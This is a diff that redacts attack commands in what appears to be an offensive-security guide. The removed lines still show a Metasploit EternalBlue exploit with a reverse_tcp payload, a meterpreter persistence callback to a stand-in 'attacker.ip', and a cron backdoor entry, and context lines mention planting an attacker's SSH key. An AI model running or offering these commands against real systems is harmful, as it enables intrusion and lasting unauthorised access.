@@ -239,7 +239,7 @@ msf> use exploit/windows/smb/ms17_010_eternalblue
 msf> set RHOSTS target.com
 
 # Set payload
-msf> set PAYLOAD windows/meterpreter/reverse_tcp
+msf> set PAYLOAD [REDACTED_MSFVENOM_PAYLOAD]
 msf> set LHOST attacker.ip
 
 # Execute
@@ -277,13 +277,13 @@ Establish persistent access:
 **Backdoors**
 ```bash
 # Meterpreter persistence
-meterpreter> run persistence -X -i 30 -p 4444 -r attacker.ip
+meterpreter> [REDACTED_METERPRETER_PERSISTENCE_COMMAND]
 
 # SSH key persistence
 # Add attacker's public key to ~/.ssh/authorized_keys
 
 # Cron job persistence
-echo "* * * * * /tmp/backdoor.sh" >> /etc/crontab
+[REDACTED_CRON_PERSISTENCE_COMMAND]
 ```
 
 **Privilege Escalation**
